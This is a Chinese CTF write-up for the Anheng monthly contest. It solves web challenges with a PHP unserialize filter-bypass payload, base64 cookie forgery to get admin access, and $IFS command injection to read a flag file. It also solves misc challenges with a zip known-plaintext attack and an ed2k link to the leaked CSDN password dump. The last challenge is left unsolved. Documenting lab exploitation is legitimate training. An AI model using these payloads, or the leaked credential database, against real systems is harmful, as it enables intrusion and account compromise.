[TOC]



# web1-easy

## 解题思路

首先打开题目链接，看到的是一段源代码

```php
 <?php  
@error_reporting(1); 
include 'flag.php';
class baby 
{   
    public $file;
    function __toString()      
    {          
        if(isset($this->file)) 
        {
            $filename = "./{$this->file}";        
            if (file_get_contents($filename))         
            {              
                return file_get_contents($filename); 
            } 
        }     
    }  
}  
if (isset($_GET['data']))  
{ 
    $data = $_GET['data'];
    preg_match('/[oc]:\d+:/i',$data,$matches);
    if(count($matches))
    {
        die('Hacker!');
    }
    else
    {
        $good = unserialize($data);
        echo $good;
    }     
} 
else 
{ 
    highlight_file("./index.php"); 
} 
?> 
```

通过查看源代码，可以发现，可以利用反序列化进行任意文件读取。

自带了一个baby类，里面的`_toString()` 可以使用`file_get_contents` 读取文件内容。

本地构造序列化：

```php
O:4:“baby”:1:{s:4:“file”;s:8:“flag.php”;}
```

由于存在过滤语句

```
preg_match('/[oc]:\d+:/i',$data,$matches);
```

因此需要绕过过滤。waf掉了`[oc]:` 数字

可以使用`+` 绕过，但是直接传入符合，会被服务器认为是空格，因此需要编码后传输。

最终的payload就是

```php
O:%2b4:"baby":1:{s:4:"file";s:8:"flag.php";}
```

输入url如下

```php
101.71.29.5:10027/?data=O:%2b4:"baby":1:{s:4:"file";s:8:"flag.php";}
```

查看源代码，可以发现flag

# web2-ezweb2

## 解题思路

首先打开页面，发现是一个cms的常规首页页面，源代码各方面未发现任何问题。

使用burp抓包。

发现首页页面在cookie中存在一个字段` user=dXNlcg%3D%3D` ，将`dXNlcg%3D%3D` 转码后，得到的内容是`user` 。

猜测这个可以更改为`admin` 来伪造管理员。将`admin` 使用base64转码，`YWRtaW4=` ，转码完成后篡改数据包。

![1547264443236](F:\学习资料\github\ctf-writeup\安恒杯\第27周\assets\1547264443236.png)

forward以后，会发现跳转到`/admin.php` 页面，同样cookie中还存在一个user字段，并且依然需要修改。

![1547264511102](F:\学习资料\github\ctf-writeup\安恒杯\第27周\assets\1547264511102.png)

成功进入管理后台页面。

![1547264541800](F:\学习资料\github\ctf-writeup\安恒杯\第27周\assets\1547264541800.png)

尝试输入内容，并抓包，发现这是一个命令行窗口。可以用来执行命令。但是经过尝试，过滤了空格。需要想办法绕过空格。

linux下，可以通过`$IFS` 来代替空格。因此构造payload

```
ls$IFS/
```

![1547264725787](F:\学习资料\github\ctf-writeup\安恒杯\第27周\assets\1547264725787.png)

可以发现，根目录有个文件叫做`ffLAG_404` ，我们查看这个文件

```
cat$IFS/ffLAG_404
```

成功拿到flag

# misc1-签到

## 题干

关注"安恒网络空间安全讲武堂",去寻找你的flag吧! 

## 解题思路

前往公众号，输入`flag`

回复说让回答一个急转弯:什么牛不会跑（打一动物），答案是蜗牛

然后又让输入：安恒杯月赛我来了

终于拿到flag

# misc2-学习资料

## 题干

你能发现这学习资料下的真实的东西么？ 

附件的下载链接：

https://xpro-adl.91ctf.com/userdownload?filename=5c19f90d2677e.zip&type=attach&feature=2018-12

## 解题思路

下载文件，是一个zip

打开以后发现其中有一个加密的zip文件和txt文件。

![1547451546550](F:\学习资料\github\ctf-writeup\安恒杯\第27周\assets\1547451546550.png)

其中“只要学不死就往死里学”中也包含文件“备忘录.txt”。猜测这用到了zip的明文攻击。

使用winrar，将解压出来的“备忘录.txt”压缩为zip文件（一定要用winrar，不然加密算法不一致，会无法使用）

使用archpr 4.53的明文攻击模块，进行攻击。

![1547452165583](F:\学习资料\github\ctf-writeup\安恒杯\第27周\assets\1547452165583.png)

最终得到文件口令`1qazmko098`

解压后，打开另一个word文档"学习资料.docx"

![1547452256355](F:\学习资料\github\ctf-writeup\安恒杯\第27周\assets\1547452256355.png)

看到如上内容，将图片移开，看到flag

但是，无法复制。

直接将word文件以压缩文件的方式解压缩一遍，找到`word/document.xml`文件，里面有flag，直接复制提交即可。

# misc3-变换的指纹

## 题干

这是个粗心的出题人，压缩秘密都是直接复制来就往里塞 

一个压缩文件

## 解题思路

首先打开压缩文件，提示内容是

```
还记得那年的CSDN用户数据泄露时间吗？解压密码就在里边哦！
暴力破解是不明智的选择，要充分发挥百度或者谷歌的作用。
```

根据提示，果断找CSDN用户数据泄露时间点啊。找到是2011年12月21日，猜测密码是`20111221`，发现不是，果然太单纯。那就说明要撞库了，去下载csdn用户密码爆破吧。

csdn社工库的地址如下：

ed2k://|file|www.csdn.net.sql|287238395|7C81CC2A2B57411BD107ACFF2BA8DDEE|/ 

最后爆破出来的密码是`!(()!@)6125dou  `，注意最后有一个空格。

解压出来是一个gif文件。其中包含44个帧，每一帧包含一个数字。

最终将所有数字收集下来以后，得出如下字符串：



未解









